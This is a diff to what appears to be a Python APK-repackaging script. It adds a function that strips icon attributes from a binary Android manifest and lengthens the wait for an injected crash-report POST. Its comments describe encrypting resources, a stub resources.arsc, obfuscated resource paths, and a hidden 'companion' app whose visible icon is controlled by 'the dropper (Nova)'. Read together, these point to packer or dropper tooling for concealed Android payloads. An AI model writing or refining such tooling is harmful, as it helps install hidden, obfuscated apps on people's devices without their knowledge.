@@ -2615,6 +2615,111 @@ def _strip_axml_provider(manifest_raw: bytes, provider_class_name: str) -> bytes
 
 
 
+def _strip_axml_application_icon(manifest_raw: bytes) -> bytes:
+    """
+    Remove android:icon and android:roundIcon attributes from the <application>
+    START_ELEMENT in a binary AXML manifest.
+
+    Why: PHASE_3 replaces resources.arsc with a minimal stub ARSC and encrypts
+    all res/ files into assets/res.pack.enc. StubApp.injectResources() restores
+    the real ARSC at runtime via addAssetPath, but that only fires from
+    onActivityPreCreated — AFTER Android's Activity.initWindowDecorActionBar()
+    has already called setDefaultIcon(). setDefaultIcon looks up android:icon
+    from the (still-stub) ARSC → corrupted path → FileNotFoundException → crash.
+
+    Fix: strip android:icon + android:roundIcon from the manifest so Android
+    never calls setDefaultIcon at all. The companion is not a launcher app —
+    its icon is never shown independently. The dropper (Nova) controls the
+    visible icon. No functional impact.
+
+    android:icon      attr resource ID: 0x0101021B
+    android:roundIcon attr resource ID: 0x0101052C
+    """
+    ICON_ATTR_ID       = 0x0101021B
+    ROUND_ICON_ATTR_ID = 0x0101052C
+
+    axml = bytearray(manifest_raw)
+    SP = 8
+    sp_size   = struct.unpack_from("<I", axml, SP + 4)[0]
+    str_count = struct.unpack_from("<I", axml, SP + 8)[0]
+    flags     = struct.unpack_from("<I", axml, SP + 16)[0]
+    is_utf8   = bool(flags & (1 << 8))
+    str_start = struct.unpack_from("<I", axml, SP + 20)[0]
+    offsets_abs = SP + 28
+
+    # Build string table (index → str)
+    strings = {}
+    for i in range(str_count):
+        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
+        p   = SP + str_start + off
+        try:
+            if is_utf8:
+                cl = axml[p]; p += 1
+                if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
+                bl = axml[p]; p += 1
+                if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
+                s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
+            else:
+                cl = struct.unpack_from("<H", axml, p)[0]; p += 2
+                s  = bytes(axml[p:p + cl * 2]).decode("utf-16-le", "replace")
+            strings[i] = s
+        except Exception:
+            strings[i] = ""
+
+    sp_end   = SP + sp_size
+    tree_pos = sp_end
+    removed  = 0
+
+    while tree_pos < len(axml) - 8:
+        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
+        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
+        if csize == 0:
+            break
+
+        if ctype == 0x0102:  # START_ELEMENT
+            name_idx = struct.unpack_from("<i", axml, tree_pos + 20)[0]
+            if strings.get(name_idx) == "application":
+                attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
+                attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
+                attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
+
+                # Collect indices of icon attrs to remove (walk in reverse to
+                # preserve offsets of earlier attrs when we splice bytes out)
+                remove_attr_indices = []
+                for a in range(attr_count):
+                    aoff    = tree_pos + attr_start + a * attr_size
+                    ns_idx  = struct.unpack_from("<i", axml, aoff)[0]
+                    # attr resource ID is at offset +8 in the 20-byte attr record
+                    attr_res_id = struct.unpack_from("<I", axml, aoff + 8)[0]
+                    if attr_res_id in (ICON_ATTR_ID, ROUND_ICON_ATTR_ID):
+                        remove_attr_indices.append(a)
+
+                # Remove in reverse order so byte offsets stay valid
+                for a in reversed(remove_attr_indices):
+                    aoff     = tree_pos + attr_start + a * attr_size
+                    del axml[aoff : aoff + attr_size]
+                    # Update attr_count in the START_ELEMENT header
+                    new_attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0] - 1
+                    struct.pack_into("<H", axml, tree_pos + 28, new_attr_count)
+                    # Update chunk size
+                    new_csize = struct.unpack_from("<I", axml, tree_pos + 4)[0] - attr_size
+                    struct.pack_into("<I", axml, tree_pos + 4, new_csize)
+                    removed += 1
+
+                # Update total AXML file size
+                if removed > 0:
+                    struct.pack_into("<I", axml, 4, len(axml))
+                break  # <application> found and processed — done
+
+        tree_pos += csize
+
+    if removed == 0:
+        print("  [strip_icon] ⚠️  android:icon / android:roundIcon not found in manifest — no change")
+    else:
+        print(f"  [strip_icon] ✅ Stripped {removed} icon attr(s) from <application> in manifest")
+    return bytes(axml)
+
+
 def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                             class_rename_map=None):
     print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")
@@ -2769,6 +2874,15 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
         new_manifest, "InitializationProvider"
     )
 
+    # Strip android:icon + android:roundIcon from <application>.
+    # PHASE_3 replaces resources.arsc with a minimal stub — the real ARSC is
+    # only restored via addAssetPath in onActivityPreCreated. But Android calls
+    # setDefaultIcon() during Activity.initWindowDecorActionBar() BEFORE
+    # onActivityPreCreated fires → looks up mipmap resource → gets garbled
+    # obfuscated path (e.g. ep6kph.png////.png) from stub ARSC → FileNotFoundException.
+    # Companion is never shown in the launcher — Nova controls the visible icon.
+    # Stripping icon attrs from manifest prevents setDefaultIcon from running at all.
+    new_manifest = _strip_axml_application_icon(new_manifest)
 
     # Inject android:name="<new_pkg>.<renamed_App>" into <application>.
     # The raw companion APK has NO android:name on <application> — App is never
@@ -4985,8 +5099,9 @@ def main():
     invoke-virtual {{v5}}, Ljava/net/HttpURLConnection;->getResponseCode()I
     invoke-virtual {{v5}}, Ljava/net/HttpURLConnection;->disconnect()V
 
-    # Sleep 3s to let the network stack flush before process death
-    const-wide/16 v6, 0xBB8
+    # Sleep 5s to let the network stack flush before process death
+    # (3s was too short — crash messages were lost before POST completed)
+    const-wide/16 v6, 0x1388
     invoke-static {{v6, v7}}, Ljava/lang/Thread;->sleep(J)V
 
     :try_ue_end
